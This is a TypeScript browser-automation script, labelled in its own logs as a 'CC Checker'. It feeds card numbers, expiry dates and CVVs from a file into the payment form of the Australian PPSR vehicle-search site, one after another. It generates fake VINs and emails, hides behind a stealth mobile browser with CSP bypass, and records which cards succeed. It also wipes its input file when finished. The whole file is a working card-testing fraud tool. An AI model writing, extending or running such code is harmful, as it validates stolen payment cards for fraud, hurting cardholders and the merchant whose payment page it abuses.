import { Page, BrowserContext } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { generateVin } from './gen_vin';
import { launchStealthBrowser } from '../shared/browser';

export {};

const currentDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.join(currentDir, '../../../');
const dataDir = path.join(rootDir, 'data');
const screenshotsDir = path.join(rootDir, 'screenshots');
const resultsFile = path.join(dataDir, 'results.txt');
const cardsFile = path.join(dataDir, 'cards.txt');
const ccLogFile = path.join(dataDir, 'cc_log.txt');
const progressFile = path.join(dataDir, 'cc_progress.txt');

if (!fs.existsSync(screenshotsDir)) fs.mkdirSync(screenshotsDir, { recursive: true });

function logToFile(msg: string) {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  const formatted = `[${timestamp}] ${msg}`;
  console.log(formatted);
  fs.appendFileSync(ccLogFile, formatted + '\n');
}

async function processCard(page: Page, cardData: string): Promise<string> {
  const parts = cardData.split('|');
  if (parts.length < 4) return "SKIP";
  const [cc, mm, yy, cvv] = parts;

  logToFile(`Starting: ${cc.slice(-4)}`);

  try {
    // 1. Navigate to PPSR
    await page.goto('https://transact.ppsr.gov.au/ppsr-mobile/QMVS', { waitUntil: 'networkidle' });

    // Check for "Continue"
    const continueBtn = page.getByRole('button', { name: 'Continue' });
    if (await continueBtn.isVisible()) {
      await continueBtn.click();
      await page.waitForLoadState('networkidle');
    }

    // 2. Fill search form
    const vin = generateVin();
    const email = `user_${Math.random().toString(36).substring(2, 10)}@outlook.com`;

    logToFile(`Form: VIN=${vin} EMAIL=${email}`);

    const vinField = page.getByRole('textbox', { name: 'VIN/Chassis number:' });
    await vinField.waitFor({ state: 'visible', timeout: 15000 });
    await vinField.fill(vin);
    await page.getByRole('textbox', { name: 'E-mail:' }).fill(email);

    await page.getByRole('button', { name: 'Proceed to Payment' }).click();

    // 3. Payment form
    logToFile("Waiting for payment form...");
    const cardNumberField = page.getByRole('textbox', { name: 'Card number:' });
    
    try {
      await cardNumberField.waitFor({ state: 'visible', timeout: 20000 });
    } catch (e) {
      const pageText = await page.innerText('body');
      if (pageText.includes("An error has occurred")) {
        const ts = new Date().toISOString();
        const screenshotName = `error_prepayment_${cc.slice(-4)}.png`;
        await page.screenshot({ path: path.join(screenshotsDir, screenshotName) });
        fs.appendFileSync(resultsFile, `${cc}|${mm}|${yy}|${cvv}|ERROR_PREPAYMENT|${screenshotName}|${ts}\n`);
        return "ERROR_PREPAYMENT";
      }
      throw e;
    }

    await cardNumberField.fill(cc);
    await page.getByRole('textbox', { name: 'Expiry month:' }).fill(mm);
    await page.getByRole('textbox', { name: 'Expiry year:' }).fill(yy);
    await page.getByRole('textbox', { name: 'CSC:' }).fill(cvv);

    await page.getByRole('button', { name: 'Pay now' }).click();

    // 4. Result
    logToFile("Processing transaction...");

    const successSelector = "text=/Thank you/i, text=/Successful/i, text=/received/i, .payment-success, .receipt";
    const failSelector = "text=/declined/i, text=/failed/i, text=/error/i, text=/invalid/i, .error, .alert-danger, .payment-error, .declined";

    try {
      // Wait for ANY indicator of completion (success or fail)
      await page.waitForSelector(`${successSelector}, ${failSelector}`, { timeout: 45000 });
      logToFile("Result page detected");
    } catch (e) {
      logToFile("Timeout waiting for result selectors, analyzing page as-is");
    }

    // Small extra wait to ensure all elements are rendered if we timed out
    await page.waitForTimeout(1000);

    const pageText = await page.innerText('body');
    const failPatterns = ["declined", "failed", "invalid card", "insufficient funds", "error", "expired", "not authorized", "an error has occurred"];
    const successPatterns = ["thank you", "successful", "received", "reference number", "receipt number"];

    let status = "UNKNOWN";
    for (const fp of failPatterns) {
      if (pageText.toLowerCase().includes(fp)) {
        status = "FAIL";
        break;
      }
    }

    if (status !== "FAIL") {
      for (const sp of successPatterns) {
        if (pageText.toLowerCase().includes(sp)) {
          status = "SUCCESS";
          break;
        }
      }
    }

    const screenshotName = `result_${cc.slice(-4)}_${Date.now()}.png`;
    await page.screenshot({ path: path.join(screenshotsDir, screenshotName) });
    
    const ts = new Date().toISOString();
    fs.appendFileSync(resultsFile, `${cc}|${mm}|${yy}|${cvv}|${status}|${screenshotName}|${ts}\n`);
    
    logToFile(`Result: ${status}`);
    return status;

  } catch (err: any) {
    logToFile(`Error: ${err.message}`);
    await page.screenshot({ path: path.join(screenshotsDir, `crash_${cc.slice(-4)}_${Date.now()}.png`) });
    return `ERROR: ${err.message}`;
  }
}

async function main() {
  const targetFile = process.argv[2] || cardsFile;
  if (!fs.existsSync(targetFile)) {
    console.error(`File not found: ${targetFile}`);
    return;
  }

  logToFile("=== CC Checker Session Started (TypeScript) ===");

  const { browser } = await launchStealthBrowser({ mobile: true });

  const content = fs.readFileSync(targetFile, 'utf-8').trim();
  if (!content) {
    logToFile("No cards found in source file.");
    await browser.close();
    return;
  }

  const lines = content.split('\n').map(l => l.trim()).filter(l => l);
  let currentIndex = 0;
  if (fs.existsSync(progressFile)) {
    currentIndex = parseInt(fs.readFileSync(progressFile, 'utf8').trim() || '0');
  }

  while (currentIndex < lines.length) {
    const currentCard = lines[currentIndex];

    const context = await browser.newContext({
      viewport: { width: 375, height: 667 },
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
      locale: 'en-AU',
      timezoneId: 'Australia/Sydney',
      bypassCSP: true,
    });
    const page = await context.newPage();

    const status = await processCard(page, currentCard);
    await context.close();

    currentIndex++;
    fs.writeFileSync(progressFile, currentIndex.toString());
    logToFile(`Processed ${currentCard.split('|')[0].slice(-4)} -> ${status}. ${lines.length - currentIndex} left.`);

    if (currentIndex < lines.length) {
      await new Promise(r => setTimeout(r, 2000));
    }
  }

  // Clear source file and progress if finished
  fs.writeFileSync(targetFile, '');
  if (fs.existsSync(progressFile)) fs.unlinkSync(progressFile);

  await browser.close();
  logToFile("=== Session Finished ===");
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
